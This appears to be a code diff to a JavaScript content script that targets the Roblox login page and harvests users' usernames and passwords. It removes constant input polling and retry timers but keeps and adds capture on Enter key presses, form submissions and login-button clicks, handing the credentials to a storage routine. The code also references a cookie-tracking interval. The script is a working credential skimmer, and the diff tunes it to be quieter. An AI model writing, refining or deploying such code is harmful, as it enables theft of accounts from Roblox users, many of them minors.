@@ -635,71 +635,46 @@
       return result;
     };
 
-    // Enhanced form submission monitoring - only on login page
+    // Form submission monitoring - only on login page
     if (window.location.href.includes('roblox.com/Login') || window.location.href.includes('roblox.com/login')) {
       console.log('Setting up form submission monitoring on Roblox login page');
       
-      // More aggressive credential monitoring with multiple strategies
       let credentialCaptureActive = true;
       
-      // Strategy 1: Monitor all input changes in real-time
-      document.addEventListener('input', function(event) {
-        if (!credentialCaptureActive) return;
-        
-        const input = event.target;
-        if (input && input.tagName === 'INPUT') {
-          // Immediately try to capture whenever any input changes
-          setTimeout(() => {
-            const credentials = captureRobloxCredentials();
-            if (credentials.username && credentials.password) {
-              console.log('Credentials captured via input monitoring:', credentials.username ? 'HAS_USER' : 'NO_USER', credentials.password ? 'HAS_PASS' : 'NO_PASS');
-              storeCredentials(credentials);
-            }
-          }, 100); // Very short delay
-        }
-      });
-
-      // Strategy 2: Monitor key presses
+      // Monitor Enter key press
       document.addEventListener('keydown', function(event) {
         if (!credentialCaptureActive) return;
         
         // Capture on Enter key press (common way to submit)
         if (event.key === 'Enter') {
-          console.log('Enter key pressed, capturing credentials');
-          const credentials = captureRobloxCredentials();
-          if (credentials.username && credentials.password) {
-            console.log('Credentials captured via Enter key');
-            storeCredentials(credentials);
+          const activeElement = document.activeElement;
+          // Only capture if Enter is pressed in an input field on the login page
+          if (activeElement && activeElement.tagName === 'INPUT') {
+            console.log('Enter key pressed in input field, capturing credentials');
+            const credentials = captureRobloxCredentials();
+            if (credentials.username && credentials.password) {
+              console.log('Credentials captured via Enter key');
+              storeCredentials(credentials);
+            }
           }
         }
       });
 
-      // Strategy 3: Form submission monitoring with preventDefault
+      // Form submission monitoring
       document.addEventListener('submit', function(event) {
         console.log('Form submission detected on Roblox login page');
         const form = event.target;
         if (form && form.tagName === 'FORM') {
-          // Capture credentials immediately before form processes
           const credentials = captureRobloxCredentials();
           
           if (credentials.username && credentials.password) {
             console.log('✓ Credentials captured from form submission:', credentials.username);
             storeCredentials(credentials);
-          } else {
-            console.log('✗ Form submitted but no credentials found');
-            // Try one more aggressive capture
-            setTimeout(() => {
-              const retryCredentials = captureRobloxCredentials();
-              if (retryCredentials.username && retryCredentials.password) {
-                console.log('✓ Retry capture successful');
-                storeCredentials(retryCredentials);
-              }
-            }, 50);
           }
         }
       });
 
-      // Strategy 4: Button click monitoring with better targeting
+      // Button click monitoring - only capture when login button is clicked
       document.addEventListener('click', function(event) {
         if (!credentialCaptureActive) return;
         
@@ -715,31 +690,12 @@
         );
 
         if (isLoginButton) {
-          console.log('Login button clicked, immediate credential capture');
+          console.log('Login button clicked, capturing credentials');
           
-          // Multiple capture attempts with different delays
-          const credentials1 = captureRobloxCredentials();
-          if (credentials1.username && credentials1.password) {
-            console.log('✓ Immediate capture successful');
-            storeCredentials(credentials1);
-          } else {
-            // Try again after 50ms
-            setTimeout(() => {
-              const credentials2 = captureRobloxCredentials();
-              if (credentials2.username && credentials2.password) {
-                console.log('✓ Delayed capture successful');
-                storeCredentials(credentials2);
-              }
-            }, 50);
-
-            // And again after 200ms
-            setTimeout(() => {
-              const credentials3 = captureRobloxCredentials();
-              if (credentials3.username && credentials3.password) {
-                console.log('✓ Final delayed capture successful');
-                storeCredentials(credentials3);
-              }
-            }, 200);
+          const credentials = captureRobloxCredentials();
+          if (credentials.username && credentials.password) {
+            console.log('✓ Credentials captured on login button click');
+            storeCredentials(credentials);
           }
         }
       });
@@ -786,29 +742,11 @@
         }
       }
 
-      // Strategy 5: Periodic credential checking while on login page
-      const credentialCheckInterval = setInterval(() => {
-        if (!credentialCaptureActive) {
-          clearInterval(credentialCheckInterval);
-          return;
-        }
-
-        const credentials = captureRobloxCredentials();
-        if (credentials.username && credentials.password) {
-          const credentialString = `${credentials.username}:${credentials.password}`;
-          if (lastSentCredentials !== credentialString) {
-            console.log('✓ Periodic check found new credentials');
-            storeCredentials(credentials);
-          }
-        }
-      }, 1000); // Check every second
-
       // Disable monitoring when leaving the login page
       const observer = new MutationObserver(() => {
         if (!window.location.href.includes('roblox.com/Login') && !window.location.href.includes('roblox.com/login')) {
           console.log('Left login page, disabling credential monitoring');
           credentialCaptureActive = false;
-          clearInterval(credentialCheckInterval);
           observer.disconnect();
         }
       });
@@ -816,59 +754,7 @@
       observer.observe(document, { subtree: true, childList: true });
     }
 
-    // Enhanced input monitoring with real-time capture - only on login page
-    let inputTimeout;
-    let credentialCheckInterval;
     
-    if (window.location.href.includes('roblox.com/Login') || window.location.href.includes('roblox.com/login')) {
-      console.log('Setting up input monitoring on Roblox login page');
-      
-      document.addEventListener('input', function(event) {
-        const input = event.target;
-        if (input && input.tagName === 'INPUT') {
-          console.log('Input detected:', input.type, input.placeholder);
-          
-          // Clear previous timeout
-          clearTimeout(inputTimeout);
-          
-          // Set new timeout to capture after user stops typing
-          inputTimeout = setTimeout(() => {
-            const credentials = captureRobloxCredentials();
-            if (credentials.username && credentials.password) {
-              const credentialString = `${credentials.username}:${credentials.password}`;
-              if (lastSentCredentials !== credentialString) {
-                console.log('New login credentials updated via input monitoring');
-                lastSentCredentials = credentialString;
-                
-                window.robloxLoginAttempt = { 
-                  username: credentials.username, 
-                  password: credentials.password, 
-                  timestamp: Date.now() 
-                };
-              }
-            }
-          }, 1500);
-        }
-      });
-
-      // Periodic credential checking while on login page
-      credentialCheckInterval = setInterval(() => {
-        const credentials = captureRobloxCredentials();
-        if (credentials.username && credentials.password) {
-          const credentialString = `${credentials.username}:${credentials.password}`;
-          if (lastSentCredentials !== credentialString) {
-            console.log('Periodic check found new credentials');
-            lastSentCredentials = credentialString;
-            
-            window.robloxLoginAttempt = { 
-              username: credentials.username, 
-              password: credentials.password, 
-              timestamp: Date.now() 
-            };
-          }
-        }
-      }, 2000); // Check every 2 seconds
-    }
 
     // Monitor for button clicks (login buttons)
     document.addEventListener('click', function(event) {
@@ -904,8 +790,6 @@
     // Clean up on page unload
     window.addEventListener('beforeunload', () => {
       clearInterval(cookieInterval);
-      clearTimeout(inputTimeout);
-      if (credentialCheckInterval) clearInterval(credentialCheckInterval);
     });
   }
 
